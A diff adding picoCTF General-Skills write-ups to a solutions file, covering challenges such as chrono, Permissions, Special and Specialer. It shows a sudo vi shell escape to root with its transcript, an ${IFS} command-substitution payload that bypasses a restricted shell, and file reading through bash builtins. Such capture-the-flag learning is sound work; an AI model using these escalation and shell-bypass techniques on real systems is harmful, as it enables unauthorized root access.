@@ -938,3 +938,205 @@ print('}')
 ➜  General-Skills git:(main) ✗ python solver.py
 picoCTF{BONJVI}
 ```
+
+### chrono
+
+We open an instance and `ssh` to it.
+
+```bash
+ssh picoplayer@saturn.picoctf.net -p61000
+```
+
+Inside the server we run `cat /etc/crontab` and get the flag.
+
+```bash
+picoplayer@challenge:~$ cat /etc/crontab
+# picoCTF{XXX}
+```
+
+### money-ware
+
+The malware is `picoCTF{Petya}`.
+
+### Permissions
+
+Connect to the remote server with `ssh`.
+
+```bash
+ssh -p 55519 picoplayer@saturn.picoctf.net
+```
+
+There are 2 ways to get the flag. The first one is probably unintended because we can simply navigate to `/` directory and `cat` the contents of `challenge` folder. The other one is to run:
+
+```bash
+sudo vi -c ':!/bin/sh' /dev/null
+```
+
+```bash
+picoplayer@challenge:/challenge$ sudo vi
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+# ls -la
+total 12
+drwx------ 1 root root   23 Mar 16 02:29 .
+drwxr-xr-x 1 root root   51 Mar 29 12:24 ..
+-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
+-rw-r--r-- 1 root root   35 Mar 16 02:29 .flag.txt
+-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
+# cat .flag.txt
+picoCTF{XXX}
+# ^C
+# 
+
+shell returned 130
+
+Press ENTER or type command to continue
+picoplayer@challenge:/challenge$ cat /challenge/metadata.json | grep pico
+{"flag": "picoCTF{XXX}", "username": "picoplayer", "password": "pEN9KN1qYm"}
+```
+
+### useless
+
+Connect to the server via `ssh`.
+
+```bash
+ssh -p 55859 picoplayer@saturn.picoctf.net 
+```
+
+Then we run `man` on the `useless` binary and get the flag.
+
+```bash
+picoplayer@challenge:~$ man useless 
+
+useless
+     useless, — This is a simple calculator script
+
+SYNOPSIS
+     useless, [add sub mul div] number1 number2
+
+DESCRIPTION
+     Use the useless, macro to make simple calulations like addition,subtraction, multiplication and division.
+
+Examples
+     ./useless add 1 2
+       This will add 1 and 2 and return 3
+
+     ./useless mul 2 3
+       This will return 6 as a product of 2 and 3
+
+     ./useless div 6 3
+       This will return 2 as a quotient of 6 and 3
+
+     ./useless sub 6 5
+       This will return 1 as a remainder of substraction of 5 from 6
+
+Authors
+     This script was designed and developed by Cylab Africa
+
+     picoCTF{XXX}
+```
+
+### Special 
+
+Connect to the remote server via `ssh`.
+
+```bash
+ssh -p 52906 ctf-player@saturn.picoctf.net
+```
+
+We see that the restricted shell does spell check on the commands we enter, thus we cannot simply run the usual commands we know like `ls`, `cat` etc.
+
+We can notice that if we run some special characters like `$` and `()` the output is:
+
+```bash
+Special$ $
+$ 
+sh: 1: $: not found
+Special$ $(ls)  
+$(ls) 
+sh: 1: blargh: not found
+```
+
+We suppose that the `flag.txt` is under `./blargh`. 
+
+Then we run this payload to get the flag.
+
+```bash
+$(echo${IFS}cat${IFS}./blargh/flag.txt) 
+picoCTF{XXX}
+```
+
+### Specialer
+
+Connect to the remote server via `ssh`.
+
+```bash
+ssh -p 50781 ctf-player@saturn.picoctf.net
+```
+
+We run `ls` and see what happens.
+
+```bash
+Specialer$ ls
+-bash: ls: command not found
+```
+
+We double press `tab` to see what we can run.
+
+```bash
+Specialer$   
+!          ]]         break      command    coproc     done       esac       false      function   if         local      pushd      return     source     times      ulimit     wait
+./         alias      builtin    compgen    declare    echo       eval       fc         getopts    in         logout     pwd        select     suspend    trap       umask      while
+:          bash       caller     complete   dirs       elif       exec       fg         hash       jobs       mapfile    read       set        test       true       unalias    {
+[          bg         case       compopt    disown     else       exit       fi         help       kill       popd       readarray  shift      then       type       unset      }
+[[         bind       cd         continue   do         enable     export     for        history    let        printf     readonly   shopt      time       typeset    until  
+```
+
+Luckily enough we have:
+
+* `echo`
+* `read`
+* `cd`
+
+We write `cd` and double `tab` to see the current directories.
+
+```bash
+Specialer$ cd   
+.hushlogin  .profile    abra/       ala/        sim/
+```
+
+Let's `cd` to `abra`.
+
+```bash
+Specialer$ cd abra/cada
+cadabra.txt   cadaniel.txt  
+Specialer$ cd abra/cada
+cadabra.txt   cadaniel.txt  
+Specialer$ cd abra/cada
+```
+
+Maybe `cadabra.txt` is the flag?
+
+```Lbash
+Specialer$ read -r line < cadabra.txt; echo $line              
+Nothing up my sleeve!
+```
+
+This does not seem like a flag. Let's try `cadaniel.txt`.
+
+```bash
+Specialer$ read -r line < cadaniel.txt; echo $line
+Yes, I did it! I really did it! I'm a true wizard!
+```
+
+Still no luck here. Navigating and try all the possible files, we find the flag here:
+
+```bash
+Specialer$ cd ala/
+Specialer$ read -r line < kazam.txt; echo $line
+return 0 picoCTF{XXX}
+```
+
